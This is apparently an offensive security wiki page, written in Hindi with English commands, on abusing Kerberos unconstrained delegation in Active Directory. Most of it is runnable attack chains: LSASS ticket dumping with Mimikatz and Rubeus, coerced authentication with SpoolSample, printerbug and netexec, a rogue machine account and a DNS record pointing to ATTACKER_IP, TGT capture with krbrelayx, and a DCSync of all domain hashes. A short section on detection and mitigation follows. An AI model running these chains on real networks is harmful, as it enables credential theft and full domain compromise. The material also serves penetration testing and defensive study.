# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

यह एक feature है जिसे Domain Administrator domain के अंदर किसी भी **Computer** पर सेट कर सकता है। इसके बाद, जब भी कोई **user logins** उस Computer पर करता है, तो उस user के **TGT की एक copy** DC द्वारा दिए गए **TGS के अंदर भेजी** जाती है और **LSASS में memory में save** हो जाती है। इसलिए, यदि आपके पास उस machine पर Administrator privileges हैं, तो आप **tickets को dump कर users को impersonate** कर सकेंगे।

इसलिए, यदि कोई domain admin "Unconstrained Delegation" feature activated वाले Computer में login करता है और आपके पास उस machine पर local admin privileges हैं, तो आप ticket को dump करके Domain Admin को कहीं भी impersonate कर सकेंगे (domain privesc)।

आप [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) attribute में [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) मौजूद है या नहीं, यह check करके **Computer objects with this attribute** खोज सकते हैं। आप यह LDAP filter ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’ के साथ कर सकते हैं, जो powerview करता है:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Administrator (या victim user) का ticket **Mimikatz** या **Rubeus से** [**Pass the Ticket**](pass-the-ticket.md)** करें।**\
अधिक जानकारी: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**ired.team में Unconstrained delegation के बारे में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

यदि कोई attacker **"Unconstrained Delegation" के लिए allowed computer को compromise** करने में सक्षम हो, तो वह किसी **Print server** को **धोखे से** उसके विरुद्ध **स्वचालित रूप से login** करने के लिए मजबूर कर सकता है, जिससे server की memory में **TGT** save हो जाता है।\
इसके बाद attacker **Pass the Ticket attack** कर user के रूप में **Print server computer account को impersonate** कर सकता है।

किसी भी machine के विरुद्ध Print server को login कराने के लिए आप [**SpoolSample**](https://github.com/leechristensen/SpoolSample) का उपयोग कर सकते हैं:
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
यदि TGT किसी domain controller से है, तो आप [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) कर सकते हैं और DC से सभी hashes प्राप्त कर सकते हैं।\
[**इस attack के बारे में ired.team में अधिक जानकारी।**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

यहां **authentication force करने** के अन्य तरीके देखें:


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

कोई भी अन्य coercion primitive, जो victim को आपके unconstrained-delegation host के साथ **Kerberos** का उपयोग करके authenticate करवाता है, काम करेगा। आधुनिक environments में इसका अक्सर अर्थ है कि classic PrinterBug flow को reachable RPC surface के आधार पर **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN**, या **WebClient/WebDAV**-based coercion से बदलना।

### unconstrained delegation वाले user/service account का दुरुपयोग

Unconstrained delegation केवल **computer objects** तक सीमित नहीं है। किसी **user/service account** को भी `TRUSTED_FOR_DELEGATION` के रूप में configure किया जा सकता है। इस scenario में practical requirement यह है कि account को अपने स्वामित्व वाले **SPN** के लिए Kerberos service tickets प्राप्त होने चाहिए।

इससे 2 बहुत सामान्य offensive paths बनते हैं:

1. आप unconstrained-delegation वाले **user account** का password/hash compromise करते हैं, फिर उसी account में **SPN जोड़ते** हैं।
2. Account में पहले से एक या अधिक SPNs होते हैं, लेकिन उनमें से कोई एक **stale/decommissioned hostname** की ओर point करता है; missing **DNS A record** को दोबारा बनाना ही authentication flow को hijack करने के लिए पर्याप्त है, बिना SPN set में बदलाव किए।<sup>[[8]](#references)</sup>

Minimal Linux flow:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
नोट्स:

- यह विशेष रूप से तब उपयोगी है जब unconstrained principal एक **service account** हो और आपके पास केवल उसके credentials हों, किसी joined host पर code execution न हो।
- यदि target user के पास पहले से कोई **stale SPN** है, तो AD में नया SPN लिखने की तुलना में संबंधित **DNS record** को दोबारा बनाना कम noisy हो सकता है।
- हाल की Linux-centric tradecraft में `addspn.py`, `dnstool.py`, `krbrelayx.py` और एक coercion primitive का उपयोग किया जाता है; chain पूरी करने के लिए आपको किसी Windows host को छूने की आवश्यकता नहीं होती।

### attacker-created computer के साथ Unconstrained Delegation का दुरुपयोग

आधुनिक domains में अक्सर `MachineAccountQuota > 0` होता है (default 10), जिससे कोई भी authenticated principal अधिकतम N computer objects बना सकता है। यदि आपके पास `SeEnableDelegationPrivilege` token privilege (या equivalent rights) भी है, तो आप नए बनाए गए computer को unconstrained delegation के लिए trusted सेट कर सकते हैं और privileged systems से आने वाले inbound TGTs को harvest कर सकते हैं।<sup>[[1]](#references)</sup>

High-level flow:

1) अपने नियंत्रण में एक computer बनाएं
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) domain के अंदर fake hostname को resolvable बनाएं
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) हमलावर-नियंत्रित कंप्यूटर पर Unconstrained Delegation सक्षम करें
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
यह क्यों काम करता है: unconstrained delegation के साथ, delegation-enabled computer पर LSA inbound TGTs को cache करता है। यदि आप किसी DC या privileged server को अपने fake host से authenticate करने के लिए trick करते हैं, तो उसका machine TGT store हो जाएगा और export किया जा सकता है।

4) krbrelayx को export mode में start करें और Kerberos material तैयार करें
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) DC/servers से अपने fake host पर authentication को coerce करें
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
जब कोई machine authenticate करती है, तो krbrelayx ccache files को save करेगा, उदाहरण के लिए:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) captured DC machine TGT का उपयोग करके DCSync करें
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` unprivileged computer creation को सक्षम करता है; अन्यथा explicit rights आवश्यक हैं।
- किसी computer पर `TRUSTED_FOR_DELEGATION` सेट करने के लिए `SeEnableDelegationPrivilege` (या domain admin) आवश्यक है।
- अपने fake host के लिए name resolution (DNS A record) सुनिश्चित करें, ताकि DC उस तक FQDN के माध्यम से पहुंच सके।
- Coercion के लिए viable vector (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN आदि) आवश्यक है। यदि संभव हो, तो DCs पर इन्हें disable करें।
- यदि victim account को **"Account is sensitive and cannot be delegated"** के रूप में चिह्नित किया गया है या वह **Protected Users** का सदस्य है, तो forwarded TGT service ticket में शामिल नहीं किया जाएगा; इसलिए यह chain reusable TGT प्राप्त नहीं कर सकेगी।<sup>[[9]](#references)</sup>
- यदि authenticating client/server पर **Credential Guard** enabled है, तो Windows **Kerberos unconstrained delegation** को block करता है, जिससे operator के दृष्टिकोण से अन्यथा valid coercion paths fail हो सकते हैं।

Detection और hardening के विचार:

- Event ID 4741 (computer account created) और 4742/4738 (computer/user account changed) पर alert करें, जब UAC में `TRUSTED_FOR_DELEGATION` सेट हो।
- Domain zone में असामान्य DNS A-record additions को monitor करें।
- अनपेक्षित hosts से 4768/4769 और non-DC hosts के लिए होने वाले DC-authentications में spikes पर नज़र रखें।
- `SeEnableDelegationPrivilege` को न्यूनतम आवश्यक set तक सीमित करें, जहाँ संभव हो `MachineAccountQuota=0` सेट करें, और DCs पर Print Spooler disable करें। LDAP signing और channel binding लागू करें।

### Mitigation

- DA/Admin logins को specific services तक सीमित करें
- Privileged accounts के लिए "Account is sensitive and cannot be delegated" सेट करें।

## References

- [1] [HTB: Delegate — SYSVOL creds → Targeted Kerberoast → Unconstrained Delegation → DCSync to DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Domain compromise via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (CME fork)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation in Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Domain compromise via DC print server and Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
